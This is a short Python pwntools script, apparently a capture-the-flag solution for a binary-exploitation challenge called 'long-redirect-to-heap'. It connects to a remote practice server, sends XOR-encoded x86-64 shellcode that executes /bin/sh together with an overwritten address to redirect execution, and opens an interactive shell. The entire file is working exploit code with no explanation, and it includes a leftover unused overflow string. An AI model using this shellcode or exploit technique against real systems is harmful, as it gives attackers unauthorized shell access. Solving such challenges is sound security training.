from pwn import *

#r = process('./long-redirect-to-heap')
r = remote('stack.overflow.fail', port=6001)

id = str(u64(b'\x5F\x5F\x5F\x83\xC7\x08\xFF\xD7',sign=True)).encode('ascii')

'abc123abc123abc123abc123abc123abc123abc12\xa4\x08\x40\x00\x00\x00\x00'

id_addr = p64(0x602090)
shellcode_ = b'aaaaaaaa\x48\x31\xC0\x48\x31\xD2\x52\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x48\x89\xE7\x52\x57\x48\x89\xE6\xB0\x3B\x0F\x05'+ b'\x01'*3 + id_addr[0:7]

shellcode_encode = b''
for i in range(len(shellcode_)):
    shellcode_encode += p8(0x5f ^ shellcode_[i])
exploit = id+b'\nb'+shellcode_encode+b'y\nn'
r.sendline(exploit)
r.interactive()
